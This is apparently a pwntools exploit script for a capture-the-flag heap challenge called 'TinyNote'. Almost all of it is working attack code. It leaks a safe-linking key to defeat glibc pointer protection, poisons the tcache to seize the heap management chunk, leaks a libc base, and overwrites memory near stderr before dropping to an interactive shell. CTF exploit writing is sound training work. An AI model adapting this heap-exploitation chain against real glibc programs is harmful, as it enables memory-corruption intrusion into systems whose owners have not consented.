# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './TinyNote'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('ce:',num)

def add(idx):
    cmd(1)
    sla('Index:',idx)

def delete(idx):
    cmd(4)
    sla('Index:',idx)

def show(idx):
    cmd(3)
    sla('Index:',idx)

def edit(idx,content):
    cmd(2)
    sla('Index:',idx)
    sa('Content:',content)

def get_addr(addr):
    edit(1, p64(1))
    edit(2, p64(addr))
    add(0)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0)
    delete(0)
    show(0)
    ru('Content:')
    key = uu64(6)
    heap_addr = key << 12
    
    lg('heap_addr' , heap_addr)
    
    edit(0, '\x00'*0x10)
    delete(0)
    edit(0, p64(key ^ (heap_addr + 0x10)))
    add(0)
    add(1)  # tcache 管理块前半部分
    
    delete(0)
    edit(0, '\x00'*0x10)
    delete(0)
    edit(0, p64(key ^ (heap_addr + 0x90)))
    add(0)
    add(2) # tcache 管理块后半部分
    
    for i in range(7):
        delete(1)
        edit(1, '\x00'*0x10)
    
    delete(1)
    show(1)
    
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    
    edit(1, p64(7))
    delete(0)
    
    for i in range(8):
        get_addr(heap_addr + 0x2c0 + i * 2 * (0x10))
        edit(0, p64(0) + p64(0x21))
    
    for i in range(6):
        get_addr(heap_addr + 0x2c0 + (i * 2 + 1) * (0x10))
        edit(1, p64(7))
        delete(0)
    
    stderr_addr = libc.sym['stderr']
    
    get_addr(heap_addr + 0x2a0)
    edit(0, p64((heap_addr + 0x2a0) >> 12 ^ (stderr_addr + 0x68 - 0x18)))
    lg('stderr_addr' , stderr_addr)
    
    edit(1, p64(0))
    add(0)
    
    dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   TinyNote.py
@Time    :   2022/05/25 18:27:30
@Author  :   Niyah 
'''